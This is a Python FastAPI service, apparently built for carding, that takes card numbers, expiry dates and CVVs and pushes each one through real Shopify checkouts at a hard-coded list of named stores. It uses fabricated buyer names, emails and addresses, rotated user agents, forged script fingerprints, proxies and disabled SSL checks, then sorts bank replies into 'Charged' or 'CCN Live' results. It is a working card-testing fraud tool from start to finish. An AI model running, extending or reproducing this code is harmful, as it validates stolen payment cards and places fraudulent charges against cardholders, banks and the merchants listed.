"""
Shopify Card Checker API - Hosted on Railway
Receives card data + site, does Shopify checkout, returns bank result.
"""
import os
import asyncio
import json
import random
import string
import time
import uuid
import hashlib
import re
import logging
from urllib.parse import urlparse, parse_qs, unquote

import aiohttp
from fastapi import FastAPI, HTTPException
from pydantic import BaseModel

logging.basicConfig(level=logging.INFO, format='%(asctime)s [%(name)s] %(message)s')
logger = logging.getLogger("shopify_api")

app = FastAPI(title="Shopify Card Checker API")

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
]

SHOPIFY_SITES = [
    "www.rarebeauty.com", "www.olehenriksen.com", "www.fentybeauty.com",
    "shopmissa.com", "dayspring-pens.myshopify.com", "brokeallday.myshopify.com",
    "boatcarpetbuys.myshopify.com", "aloracosmetics.myshopify.com", "www.wetnwildbeauty.com",
    "www.anastasiabeverlyhills.com", "bulletmole1.myshopify.com", "www.puravidabracelets.com",
    "www.glowrecipe.com", "biggerfive.myshopify.com", "www.revlon.com",
    "cubitt-official.myshopify.com", "better-boat.myshopify.com",
    "desert-does-it.myshopify.com", "dose-of-colors.myshopify.com", "www.brooklinen.com",
    "coyotevest.myshopify.com", "1x2r9x-2w.myshopify.com", "www.deadstock.ca",
    "www.skims.com", "www.loveyourmelon.com", "bosideng-fashion.myshopify.com",
    "www.stevemadden.com", "www.hauslabs.com", "www.teeinblue.com",
    "www.kyliecosmetics.com", "www.maccosmetics.com", "camprageous.myshopify.com",
    "couch-collectibles.myshopify.com", "biaggi-1.myshopify.com", "canisathlete.myshopify.com",
    "www.jennikayne.com", "www.kosas.com", "www.tarte.com", "www.morphe.com",
    "www.glossier.com", "brendagrands.myshopify.com", "cove-home-8002.myshopify.com",
    "colourpop.com", "www.summerfridays.com", "www.everlane.com",
    "conner-hats.myshopify.com", "negativeunderwear.com", "helmboots.com",
    "www.outdoorvoices.com", "carbon-38.myshopify.com", "www.kizik.com",
    "www.mejuri.com", "www.danielwellington.com", "bychari.myshopify.com",
    "dapper-lighting.myshopify.com",
]

FAKE_GATEWAYS = {"bogus", "test", "fake", "debug", "manual"}

LIVE_DECLINE_CODES = {
    "insufficient_funds", "do_not_honor", "generic_decline",
    "lost_card", "stolen_card", "pickup_card", "restricted_card",
    "not_permitted", "security_violation", "incorrect_cvc", "incorrect_zip",
    "card_velocity_exceeded", "transaction_not_allowed", "try_again_later",
    "fraudulent", "issuer_not_available", "processing_error",
}

ADDRESSES = [
    {'street': '1600 Pennsylvania Ave NW', 'city': 'Washington', 'state': 'DC', 'zip': '20500', 'phone': '2025551234'},
    {'street': '350 Fifth Ave', 'city': 'New York', 'state': 'NY', 'zip': '10118', 'phone': '2125551234'},
    {'street': '233 S Wacker Dr', 'city': 'Chicago', 'state': 'IL', 'zip': '60606', 'phone': '3125551234'},
    {'street': '6060 Center Dr', 'city': 'Los Angeles', 'state': 'CA', 'zip': '90045', 'phone': '3235551234'},
    {'street': '1000 Main St', 'city': 'Houston', 'state': 'TX', 'zip': '77002', 'phone': '7135551234'},
    {'street': '1234 Market St', 'city': 'Philadelphia', 'state': 'PA', 'zip': '19107', 'phone': '2155551234'},
    {'street': '500 Boylston St', 'city': 'Boston', 'state': 'MA', 'zip': '02116', 'phone': '6175551234'},
    {'street': '700 Pike St', 'city': 'Seattle', 'state': 'WA', 'zip': '98101', 'phone': '2065551234'},
    {'street': '225 Bush St', 'city': 'San Francisco', 'state': 'CA', 'zip': '94104', 'phone': '4155551234'},
    {'street': '4040 Spencer St', 'city': 'Las Vegas', 'state': 'NV', 'zip': '89119', 'phone': '7025551234'},
]

PROPOSAL_QUERY = 'query Proposal($sessionInput:SessionTokenInput!,$queueToken:String,$delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,$buyerIdentity:BuyerIdentityTermInput,$taxes:TaxTermInput,$tip:TipTermInput,$note:NoteInput,$localizationExtension:LocalizationExtensionInput,$nonNegotiableTerms:NonNegotiableTermsInput,$scriptFingerprint:ScriptFingerprintInput,$optionalDuties:OptionalDutiesInput){session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{delivery:$delivery,discounts:$discounts,payment:$payment,merchandise:$merchandise,buyerIdentity:$buyerIdentity,taxes:$taxes,tip:$tip,note:$note,nonNegotiableTerms:$nonNegotiableTerms,localizationExtension:$localizationExtension,scriptFingerprint:$scriptFingerprint,optionalDuties:$optionalDuties},queueToken:$queueToken}){__typename result{__typename ...on NegotiationResultAvailable{queueToken sellerProposal{runningTotal{...on MoneyValueConstraint{value{amount currencyCode}}}tax{...on FilledTaxTerms{totalTaxAmount{...on MoneyValueConstraint{value{amount currencyCode}}}}...on PendingTerms{__typename}}delivery{__typename ...on PendingTerms{__typename}...on FilledDeliveryTerms{deliveryLines{availableDeliveryStrategies{...on CompleteDeliveryStrategy{handle amount{...on MoneyValueConstraint{value{amount currencyCode}}}}}}}}payment{...on FilledPaymentTerms{availablePaymentLines{paymentMethod{__typename ...on PaymentProvider{paymentMethodIdentifier name}}}}}}}...on CheckpointDenied{redirectUrl __typename}...on Throttled{pollAfter queueToken __typename}...on NegotiationResultFailed{__typename}}errors{code localizedMessage}}}}'

SUBMIT_QUERY = 'mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields analytics:$analytics){__typename ...on SubmitSuccess{receipt{...ReceiptDetails}}...on SubmitAlreadyAccepted{receipt{...ReceiptDetails}}...on SubmitFailed{reason}...on SubmitRejected{errors{__typename ...on NegotiationError{code localizedMessage}...on InputValidationError{field}}}...on Throttled{pollAfter queueToken}...on CheckpointDenied{redirectUrl}...on SubmittedForCompletion{receipt{...ReceiptDetails}}}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id}...on ProcessingReceipt{id pollDelay}...on WaitingReceipt{id pollDelay}...on ActionRequiredReceipt{id}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated}}}}'

POLL_QUERY = 'query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){__typename ...on ProcessedReceipt{id}...on ProcessingReceipt{id pollDelay}...on WaitingReceipt{id pollDelay}...on ActionRequiredReceipt{id}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated}}}}}'


class CheckRequest(BaseModel):
    cc: str
    mm: str
    yy: str
    cvv: str
    site: str = None
    proxy: str = None


class CheckResponse(BaseModel):
    status: str
    response: str
    gateway: str
    amount: str = None
    site: str = None
    elapsed: float


def _get_ua():
    return random.choice(USER_AGENTS)

def _extract_between(text, start, end):
    try:
        s = text.index(start) + len(start)
        e = text.index(end, s)
        return text[s:e]
    except ValueError:
        return None

def _generate_script_fingerprint():
    sig_uuid = str(uuid.uuid4())
    seed = f"{sig_uuid}{time.time()}{random.random()}"
    signature = hashlib.sha256(seed.encode()).hexdigest()[:40]
    return {'signature': signature, 'signatureUuid': sig_uuid, 'lineItemScriptChanges': [], 'paymentScriptChanges': [], 'shippingScriptChanges': []}

def _checkout_graphql_headers(domain, checkout_url):
    source_id = hashlib.md5(f"{domain}{random.random()}".encode()).hexdigest()
    return {
        'User-Agent': _get_ua(), 'Accept': 'application/json', 'Accept-Language': 'en-US,en;q=0.9',
        'Content-Type': 'application/json', 'Origin': f'https://{domain}', 'Referer': checkout_url,
        'x-checkout-web-source-id': source_id,
    }

def _random_email():
    name = ''.join(random.choices(string.ascii_lowercase, k=8))
    num = ''.join(random.choices(string.digits, k=3))
    return f"{name}{num}@{random.choice(['gmail.com', 'yahoo.com', 'outlook.com'])}"

def _random_name():
    firsts = ["John", "James", "Robert", "Michael", "William", "David"]
    lasts = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia"]
    return random.choice(firsts), random.choice(lasts)

def _random_address():
    return random.choice(ADDRESSES)

def _is_fake_gateway(gw):
    return any(f in (gw or "").lower() for f in FAKE_GATEWAYS)

def _parse_bank_response(text):
    resp = {'response_code': '', 'transaction_id': ''}
    try:
        data = json.loads(text)
        receipt = data.get('data', {}).get('receipt', {})
        pe = receipt.get('processingError', {})
        resp['response_code'] = pe.get('code', '')
        resp['transaction_id'] = receipt.get('id', '')
    except:
        pass
    return resp

def _parse_products(data):
    products = data.get('products', [])
    if not products:
        return None
    min_price = float('inf')
    best = None
    for product in products:
        for variant in product.get('variants', []):
            if not variant.get('available', False):
                continue
            try:
                price = float(str(variant.get('price', '0')).replace(',', ''))
                if 0 < price < min_price:
                    min_price = price
                    best = {'price': f"{price:.2f}", 'variant_id': str(variant['id']), 'handle': product['handle']}
            except:
                continue
    if not best:
        for product in products:
            for variant in product.get('variants', []):
                if variant.get('available', False):
                    try:
                        price = float(str(variant.get('price', '0')).replace(',', ''))
                        best = {'price': f"{price:.2f}", 'variant_id': str(variant['id']), 'handle': product['handle']}
                    except:
                        continue
    return best

def _extract_session_token(text):
    sst = _extract_between(text, 'name="serialized-sessionToken" content="&quot;', '&q')
    if not sst:
        sst = _extract_between(text, 'name="serialized-session-token" content="&quot;', '&q')
    return sst

def _parse_seller(seller):
    if not seller or not isinstance(seller, dict):
        return '0', 'USD', '0', None, '', '0', None, None
    rt = seller.get('runningTotal', {})
    running_total = rt.get('value', {}).get('amount', '0') if isinstance(rt, dict) else '0'
    currency = rt.get('value', {}).get('currencyCode', 'USD') if isinstance(rt, dict) else 'USD'
    tax_data = seller.get('tax', {})
    tax_amount = '0'
    if isinstance(tax_data, dict) and 'totalTaxAmount' in tax_data:
        tax_amount = tax_data.get('totalTaxAmount', {}).get('value', {}).get('amount', '0')
    delivery_data = seller.get('delivery', {})
    delivery_strategy = ''
    shipping_amount = '0'
    if isinstance(delivery_data, dict) and delivery_data.get('__typename') == 'FilledDeliveryTerms':
        lines = delivery_data.get('deliveryLines', [])
        strategies = lines[0].get('availableDeliveryStrategies', []) if lines else []
        if strategies:
            delivery_strategy = strategies[0].get('handle', '')
            shipping_amount = strategies[0].get('amount', {}).get('value', {}).get('amount', '0')
    pm_id = None
    gw_name = None
    payment_data = seller.get('payment', {})
    if isinstance(payment_data, dict) and payment_data.get('__typename') == 'FilledPaymentTerms':
        payment_lines = payment_data.get('availablePaymentLines', [])
        if payment_lines:
            pm = payment_lines[0].get('paymentMethod', {})
            pm_id = pm.get('paymentMethodIdentifier')
            gw_name = pm.get('name')
    del_type = delivery_data.get('__typename') if isinstance(delivery_data, dict) else None
    return running_total, currency, tax_amount, del_type, delivery_strategy, shipping_amount, pm_id, gw_name


async def _negotiate(session, graphql_url, headers, variables):
    for attempt in range(3):
        try:
            resp = await session.post(graphql_url, json={'query': PROPOSAL_QUERY, 'variables': variables, 'operationName': 'Proposal'}, headers=headers, timeout=aiohttp.ClientTimeout(total=12))
            data = await resp.json(content_type=None)
            negotiate = data.get('data', {}).get('session', {}).get('negotiate', {})
            if not negotiate or not isinstance(negotiate, dict):
                continue
            result = negotiate.get('result', {})
            if not result or not isinstance(result, dict):
                result = negotiate
            return result
        except:
            if attempt < 2:
                await asyncio.sleep(0.3)
                continue
            return {'__typename': 'NegotiationResultFailed'}


async def _shopify_check(session, domain, cc, mm, yy, cvv):
    domain = domain.replace('https://', '').replace('http://', '').strip('/')
    base_url = f"https://{domain}"
    gw_name = 'Shopify Payments'
    UA = _get_ua()

    headers = {'User-Agent': UA, 'Accept': 'application/json', 'Content-Type': 'application/json'}
    
    # Find product
    product = None
    for endpoint in [f"{base_url}/collections/all/products.json?limit=10", f"{base_url}/products.json?limit=10"]:
        try:
            async with session.get(endpoint, headers={'User-Agent': UA, 'Accept': 'application/json'}, timeout=aiohttp.ClientTimeout(total=5)) as resp:
                if resp.status == 200:
                    data = await resp.json(content_type=None)
                    product = _parse_products(data)
                    if product:
                        break
        except:
            continue
    if not product:
        return None, "No products available", gw_name, None

    variant_id = product['variant_id']
    subtotal_price = product['price']
    first, last = _random_name()
    email = _random_email()
    addr = _random_address()
    street, city, state, s_zip, phone = addr['street'], addr['city'], addr['state'], addr['zip'], addr['phone']

    # Add to cart
    try:
        async with session.post(f"{base_url}/cart/add.js", json={'id': int(variant_id)}, headers=headers, timeout=aiohttp.ClientTimeout(total=6)) as resp:
            if resp.status != 200:
                return None, "Failed to add to cart", gw_name, None
    except:
        return None, "Failed to add to cart", gw_name, None

    # Create checkout
    ch_headers = {'User-Agent': UA, 'Accept': 'text/html,application/xhtml+xml', 'Accept-Language': 'en-US,en;q=0.9'}
    try:
        async with session.post(f"{base_url}/checkout/", headers=ch_headers, allow_redirects=True, timeout=aiohttp.ClientTimeout(total=8)) as resp:
            checkout_url = str(resp.url)
            text = await resp.text()
    except:
        return None, "Failed to create checkout", gw_name, None

    if 'login' in checkout_url.lower() or 'password' in checkout_url.lower():
        return None, "Site requires login", gw_name, None

    sst = _extract_session_token(text)
    if not sst:
        return None, "No session token", gw_name, None

    queue_token = _extract_between(text, 'queueToken&quot;:&quot;', '&q')
    stable_id = _extract_between(text, 'stableId&quot;:&quot;', '&q')
    currency = 'USD'
    pm_match = re.search(r'currencycode\s*[:=]\s*["\']?([^"\']+)["\']?', text.lower())
    if pm_match:
        currency = pm_match.group(1).upper()
    payment_method_id = _extract_between(text, 'paymentMethodIdentifier&quot;:&quot;', '&quot;')

    graphql_url = f"https://{urlparse(base_url).netloc}/checkouts/unstable/graphql"
    gql_headers = _checkout_graphql_headers(domain, checkout_url)

    addr_block = {'address1': street, 'address2': '', 'city': city, 'countryCode': 'US', 'postalCode': s_zip, 'firstName': first, 'lastName': last, 'zoneCode': state, 'phone': phone}

    merch_block = {
        'stableId': stable_id,
        'merchandise': {'productVariantReference': {'id': f'gid://shopify/ProductVariantMerchandise/{variant_id}', 'variantId': f'gid://shopify/ProductVariant/{variant_id}', 'properties': [], 'sellingPlanId': None, 'sellingPlanDigest': None}},
        'quantity': {'items': {'value': 1}},
        'expectedTotalPrice': {'value': {'amount': subtotal_price, 'currencyCode': currency}},
        'lineComponentsSource': None, 'lineComponents': [],
    }

    common_vars = {
        'sessionInput': {'sessionToken': sst}, 'queueToken': queue_token,
        'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True},
        'merchandise': {'merchandiseLines': [merch_block]},
        'buyerIdentity': {'customer': {'presentmentCurrency': currency, 'countryCode': 'US'}, 'email': email, 'emailChanged': False, 'phoneCountryCode': 'US', 'marketingConsent': [{'email': {'value': email}}], 'shopPayOptInPhone': {'countryCode': 'US'}, 'rememberMe': False},
        'tip': {'tipLines': []},
        'taxes': {'proposedAllocations': None, 'proposedTotalAmount': {'value': {'amount': '0', 'currencyCode': currency}}, 'proposedTotalIncludedAmount': None, 'proposedMixedStateTotalAmount': None, 'proposedExemptions': []},
        'note': {'message': None, 'customAttributes': []}, 'localizationExtension': {'fields': []},
        'nonNegotiableTerms': {'termsAccepted': True},
        'scriptFingerprint': _generate_script_fingerprint(), 'optionalDuties': {'buyerRefusesDuties': False},
    }

    latest_qt = [queue_token]
    def _make_vars():
        v = {**common_vars}; v['queueToken'] = latest_qt[0]; return v
    def _update_qt(result):
        if not result or not isinstance(result, dict): return
        qt = result.get('queueToken')
        if qt: latest_qt[0] = qt

    # Negotiate shipping
    try:
        step1_vars = _make_vars()
        step1_vars['delivery'] = {'deliveryLines': [{'destination': {'partialStreetAddress': addr_block}, 'selectedDeliveryStrategy': {'deliveryStrategyMatchingConditions': {'estimatedTimeInTransit': {'any': True}, 'shipments': {'any': True}}, 'options': {}}, 'targetMerchandiseLines': {'any': True}, 'deliveryMethodTypes': ['SHIPPING'], 'expectedTotalPrice': {'any': True}, 'destinationChanged': True}], 'noDeliveryRequired': [], 'useProgressiveRates': False, 'prefetchShippingRatesStrategy': None, 'supportsSplitShipping': True}
        step1_vars['payment'] = {'totalAmount': {'any': True}, 'paymentLines': [], 'billingAddress': {'streetAddress': {'address1': '', 'city': '', 'countryCode': 'US', 'lastName': '', 'zoneCode': '', 'phone': ''}}}
        
        r = await _negotiate(session, graphql_url, gql_headers, step1_vars)
        _update_qt(r)
        await asyncio.sleep(0.1)
        step1_vars['queueToken'] = latest_qt[0]
        result1 = await _negotiate(session, graphql_url, gql_headers, step1_vars)
        _update_qt(result1)

        if not result1 or not isinstance(result1, dict):
            return None, "Negotiate error: no response", gw_name, None
        tn = result1.get('__typename', '')
        if tn == 'CheckpointDenied': return None, "Checkpoint Denied", gw_name, None
        if tn == 'NegotiationResultFailed': return None, "Negotiation failed", gw_name, None
        if tn != 'NegotiationResultAvailable': return None, f"Negotiation failed: {tn}", gw_name, None

        sp1 = result1.get('sellerProposal')
        if not sp1 or not isinstance(sp1, dict): return None, "No seller proposal", gw_name, None
        running_total, currency, tax_amount, del_type, delivery_strategy, shipping_amount, api_pmi, api_gw = _parse_seller(sp1)
        if api_pmi and not payment_method_id: payment_method_id = api_pmi
        gw_name = api_gw or 'Shopify Payments'

        if not delivery_strategy: return None, "No shipping available", gw_name, None

        def _build_delivery():
            return {'deliveryLines': [{'destination': {'streetAddress': addr_block}, 'selectedDeliveryStrategy': {'deliveryStrategyMatchingConditions': {'estimatedTimeInTransit': {'any': True}, 'shipments': {'any': True}}, 'options': {'phone': phone}}, 'targetMerchandiseLines': {'any': True}, 'deliveryMethodTypes': ['SHIPPING'], 'expectedTotalPrice': {'any': True}, 'destinationChanged': False}], 'noDeliveryRequired': [], 'useProgressiveRates': False, 'prefetchShippingRatesStrategy': None, 'supportsSplitShipping': True}

        step2_vars = _make_vars()
        step2_vars['delivery'] = _build_delivery()
        step2_vars['payment'] = {'totalAmount': {'any': True}, 'paymentLines': [], 'billingAddress': {'streetAddress': addr_block}}
        result2 = await _negotiate(session, graphql_url, gql_headers, step2_vars)
        _update_qt(result2)
        if result2 and isinstance(result2, dict) and result2.get('__typename') == 'NegotiationResultAvailable':
            sp2 = result2.get('sellerProposal')
            if sp2 and isinstance(sp2, dict):
                running_total, currency, tax_amount, _, delivery_strategy, shipping_amount, api_pmi2, api_gw2 = _parse_seller(sp2)
                if api_pmi2 and not payment_method_id: payment_method_id = api_pmi2
                if api_gw2: gw_name = api_gw2
    except Exception as e:
        return None, f"Negotiate error: {str(e)[:50]}", gw_name, None

    # Tokenize card
    year_full = f"20{yy}" if len(yy) == 2 else yy
    formatted_card = " ".join([cc[i:i+4] for i in range(0, len(cc), 4)])
    token_payload = {"credit_card": {"month": mm, "name": f"{first} {last}", "number": formatted_card, "verification_value": cvv, "year": year_full}, "payment_session_scope": domain}

    try:
        async with session.post('https://deposit.shopifycs.com/sessions', json=token_payload, headers={'Content-Type': 'application/json', 'User-Agent': UA}, timeout=aiohttp.ClientTimeout(total=6)) as resp:
            vault_data = await resp.json(content_type=None)
            if 'id' not in vault_data:
                return None, "Invalid card - vault rejected", gw_name, None
            payment_token = vault_data['id']
    except:
        return None, "Invalid card - vault failed", gw_name, None

    # Submit payment
    try:
        payment_input = {'totalAmount': {'any': True}, 'paymentLines': [{'paymentMethod': {'directPaymentMethod': {'paymentMethodIdentifier': payment_method_id, 'sessionId': payment_token, 'billingAddress': {'streetAddress': addr_block}, 'cardSource': None}}, 'amount': {'value': {'amount': running_total, 'currencyCode': currency}}, 'dueAt': None}], 'billingAddress': {'streetAddress': addr_block}}
        step3_vars = _make_vars()
        step3_vars['delivery'] = _build_delivery()
        step3_vars['payment'] = payment_input
        result3 = await _negotiate(session, graphql_url, gql_headers, step3_vars)
        _update_qt(result3)
        if result3 and isinstance(result3, dict) and result3.get('__typename') == 'NegotiationResultAvailable':
            sp3 = result3.get('sellerProposal')
            if sp3 and isinstance(sp3, dict):
                running_total, currency, tax_amount, _, delivery_strategy, shipping_amount, _, api_gw3 = _parse_seller(sp3)
                if api_gw3: gw_name = api_gw3
                payment_input['paymentLines'][0]['amount']['value']['amount'] = running_total
    except:
        pass

    # Submit order
    submit_delivery = {'deliveryLines': [{'destination': {'streetAddress': addr_block}, 'selectedDeliveryStrategy': {'deliveryStrategyByHandle': {'handle': delivery_strategy, 'customDeliveryRate': False}, 'options': {'phone': phone}}, 'targetMerchandiseLines': {'lines': [{'stableId': stable_id}]}, 'deliveryMethodTypes': ['SHIPPING'], 'expectedTotalPrice': {'value': {'amount': shipping_amount, 'currencyCode': currency}}, 'destinationChanged': False}], 'noDeliveryRequired': [], 'useProgressiveRates': True, 'prefetchShippingRatesStrategy': None, 'supportsSplitShipping': True}
    submit_merch = {'stableId': stable_id, 'merchandise': merch_block['merchandise'], 'quantity': {'items': {'value': 1}}, 'expectedTotalPrice': {'any': True}, 'lineComponentsSource': None, 'lineComponents': []}
    checkout_token = re.search(r'/checkouts/cn/([^/]+)', checkout_url)
    attempt_token = checkout_token.group(1) if checkout_token else checkout_url.split('/')[-1].split('?')[0]

    completion_vars = {'input': {'sessionInput': {'sessionToken': sst}, 'queueToken': latest_qt[0], 'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True}, 'delivery': submit_delivery, 'merchandise': {'merchandiseLines': [submit_merch]}, 'payment': payment_input, 'buyerIdentity': {'customer': {'presentmentCurrency': currency, 'countryCode': 'US'}, 'email': email, 'emailChanged': False, 'phoneCountryCode': 'US', 'marketingConsent': [{'email': {'value': email}}], 'shopPayOptInPhone': {'number': phone, 'countryCode': 'US'}, 'rememberMe': False}, 'tip': {'tipLines': []}, 'taxes': {'proposedAllocations': None, 'proposedTotalAmount': {'value': {'amount': tax_amount, 'currencyCode': currency}}, 'proposedTotalIncludedAmount': None, 'proposedMixedStateTotalAmount': None, 'proposedExemptions': []}, 'note': {'message': None, 'customAttributes': []}, 'localizationExtension': {'fields': []}, 'nonNegotiableTerms': {'termsAccepted': True}, 'scriptFingerprint': _generate_script_fingerprint(), 'optionalDuties': {'buyerRefusesDuties': False}}, 'attemptToken': attempt_token, 'metafields': [], 'analytics': {'requestUrl': checkout_url}}

    async def _do_submit():
        try:
            r = await session.post(graphql_url, json={'query': SUBMIT_QUERY, 'variables': completion_vars, 'operationName': 'SubmitForCompletion'}, headers=gql_headers, timeout=aiohttp.ClientTimeout(total=10))
            return await r.text()
        except:
            return '{"error":"submit_timeout"}'

    text = await _do_submit()
    logger.info(f"Submit response: {text[:300]}")

    if "Your order total has changed." in text:
        text = await _do_submit()
    if "The requested payment method is not available." in text:
        return None, "Payment method unavailable", gw_name, None

    receipt_id = None
    try:
        resp_json = json.loads(text)
        submit_data = resp_json.get('data', {}).get('submitForCompletion', {})
        typename = submit_data.get('__typename', '')

        if typename == 'SubmitRejected':
            errors = submit_data.get('errors', [])
            codes = [e.get('code', '') for e in errors]
            technical = ['INVALID_VARIABLE', 'VALIDATION_CUSTOM', 'ARTIFACT_DISSATISFACTION', 'PAYMENTS_PROPOSED_GATEWAY_UNAVAILABLE', 'INPUT_VALIDATION_ERROR']
            if any(c in technical for c in codes):
                return None, f"Gateway Error - {', '.join(codes[:2])}", gw_name, None
            if 'CAPTCHA_METADATA_MISSING' in codes or 'CHECKPOINT_DENIED' in codes:
                return None, "Checkpoint Denied", gw_name, None
            all_text = ' '.join(codes + [e.get('localizedMessage', '') for e in errors]).lower()
            if 'terms' in all_text:
                text = await _do_submit()
                try:
                    resp_json = json.loads(text)
                    submit_data = resp_json.get('data', {}).get('submitForCompletion', {})
                    typename = submit_data.get('__typename', '')
                except:
                    return None, "Terms Required (retry failed)", gw_name, None
            elif codes:
                return running_total, f"Declined - Rejected: {', '.join(codes[:2])}", gw_name, None

        if typename in ('SubmitSuccess', 'SubmitAlreadyAccepted', 'SubmittedForCompletion'):
            receipt_id = submit_data.get('receipt', {}).get('id')
        elif typename == 'SubmitFailed':
            return running_total, f"Declined - Submit failed: {submit_data.get('reason', 'unknown')}", gw_name, None
        elif typename == 'Throttled':
            await asyncio.sleep(2)
            text = await _do_submit()
            try:
                resp_json = json.loads(text)
                submit_data = resp_json.get('data', {}).get('submitForCompletion', {})
                if submit_data.get('__typename') in ('SubmitSuccess', 'SubmitAlreadyAccepted', 'SubmittedForCompletion'):
                    receipt_id = submit_data['receipt']['id']
                else:
                    return None, "Throttled", gw_name, None
            except:
                return None, "Throttled", gw_name, None
        elif typename == 'CheckpointDenied':
            return None, "Checkpoint Denied", gw_name, None
    except Exception as e:
        logger.info(f"Submit parse error: {str(e)[:100]} raw={text[:200]}")
        code = _extract_between(text, '"code":"', '"') or ''
        if code:
            return running_total, f"Declined - {code}", gw_name, None
        return None, "Processing error", gw_name, None

    if not receipt_id:
        return None, "No receipt", gw_name, None

    # Poll for result
    await asyncio.sleep(0.2)
    poll_json = {'query': POLL_QUERY, 'variables': {'receiptId': receipt_id, 'sessionToken': sst}, 'operationName': 'PollForReceipt'}
    
    for _ in range(5):
        async with session.post(graphql_url, json=poll_json, headers=gql_headers) as resp:
            text = await resp.text()
            if 'ProcessingReceipt' not in text and 'WaitingReceipt' not in text:
                break
            await asyncio.sleep(0.5)

    if 'ProcessingReceipt' in text or 'WaitingReceipt' in text:
        await asyncio.sleep(1)
        async with session.post(graphql_url, json=poll_json, headers=gql_headers) as resp:
            text = await resp.text()
        if 'ProcessingReceipt' in text or 'WaitingReceipt' in text:
            return None, "Processing - Bank still deciding", gw_name, None

    if 'ActionRequiredReceipt' in text:
        return running_total, "CCN Live - 3DS Required", gw_name, {'amount': running_total}

    if 'ProcessedReceipt' in text and 'processingError' not in text.lower() and 'FailedReceipt' not in text:
        return running_total, "Charged", gw_name, {'amount': running_total}

    # Parse bank code
    code = None
    error_message = None
    try:
        resp_json = json.loads(text)
        receipt = resp_json.get('data', {}).get('receipt', {})
        if isinstance(receipt, dict):
            if receipt.get('__typename') == 'FailedReceipt':
                pe = receipt.get('processingError', {})
                code = pe.get('code', '') or ''
                error_message = pe.get('messageUntranslated', '') or ''
            elif receipt.get('__typename') == 'ProcessedReceipt':
                return running_total, "Charged", gw_name, {'amount': running_total}
    except:
        pass

    if not code:
        code = _extract_between(text, '{"code":"', '"') or ''
    if not error_message:
        error_message = _extract_between(text, '"messageUntranslated":"', '"') or ''

    tl = (text + (code or '') + (error_message or '')).lower()
    logger.info(f"Poll result: code={code} msg={error_message[:80]}")

    if 'ActionRequiredReceipt' in text:
        return running_total, "CCN Live - 3DS Required", gw_name, {'amount': running_total}

    LIVE_KEYWORDS = ['insuff', 'funds', 'do_not_honor', 'generic_decline', 'card_velocity', 'try_again_later', 'not_permitted', 'fraudulent', 'security_violation', 'restricted_card', 'pickup_card', 'lost_card', 'stolen_card', 'issuer_not_available', 'processing_error', 'approve_with_id', 'call_issuer']
    if any(k in tl for k in LIVE_KEYWORDS):
        return running_total, f"CCN Live - {code or 'Declined'}", gw_name, {'amount': running_total}
    if any(k in tl for k in ['invalid_cvc', 'incorrect_cvc']):
        return running_total, "CCN Live - Invalid CVV", gw_name, {'amount': running_total}
    if 'zip' in tl and ('invalid' in tl or 'incorrect' in tl):
        return running_total, "CCN Live - Invalid ZIP", gw_name, {'amount': running_total}
    if any(k in tl for k in ['expired', 'card_expired']):
        return running_total, "Declined - Card Expired", gw_name, {'amount': running_total}
    
    # Card reached the bank = card is LIVE
    return running_total, f"CCN Live - {code or 'Declined by Bank'}", gw_name, {'amount': running_total}


async def check_card(cc, mm, yy, cvv, site=None, proxy=None):
    start = time.time()
    card_short = f"{cc[:6]}xx{cc[-4:]}"

    proxy_url = None
    if proxy and proxy != "NONE" and proxy.strip():
        p = proxy.strip()
        if p.startswith("http://") or p.startswith("https://") or p.startswith("socks5://"):
            proxy_url = p
        elif ":" in p:
            parts = p.split(":")
            if len(parts) == 4:
                proxy_url = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
            elif len(parts) == 2:
                proxy_url = f"http://{parts[0]}:{parts[1]}"

    if site:
        sites = [site.replace("https://", "").replace("http://", "").rstrip("/")]
    else:
        sites = SHOPIFY_SITES.copy()
        random.shuffle(sites)
        sites = sites[:6]

    for s in sites:
        logger.info(f"Checking {card_short} on {s} proxy={proxy_url is not None}")
        try:
            kw = {"timeout": aiohttp.ClientTimeout(total=15), "connector": aiohttp.TCPConnector(ssl=False)}
            if proxy_url:
                kw["proxy"] = proxy_url
            async with aiohttp.ClientSession(**kw) as session:
                result = await asyncio.wait_for(_shopify_check(session, s, cc, mm, yy, cvv), timeout=18)
                amount, response, gw_name = result[0], result[1], result[2]
                extra = result[3] if len(result) > 3 else None
                elapsed = round(time.time() - start, 2)

                skip = ["No products", "No session", "No shipping", "Checkpoint", "login", "password", "Throttled", "Gateway Error", "Negotiation", "Processing error", "No receipt", "Invalid card"]
                if any(k.lower() in (response or "").lower() for k in skip):
                    logger.info(f"SKIP {s}: {response}")
                    continue

                if _is_fake_gateway(gw_name):
                    continue

                return {"status": "ok", "response": response, "gateway": gw_name, "amount": amount, "site": s, "elapsed": elapsed}
        except asyncio.TimeoutError:
            logger.info(f"TIMEOUT {s}")
            continue
        except Exception as e:
            logger.info(f"ERROR {s}: {str(e)[:80]}")
            continue

    elapsed = round(time.time() - start, 2)
    return {"status": "error", "response": "All sites failed", "gateway": "Shopify Payments", "amount": None, "site": None, "elapsed": elapsed}


@app.get("/")
async def root():
    return {"status": "running", "service": "Shopify Card Checker API"}

@app.get("/health")
async def health():
    return {"status": "ok"}

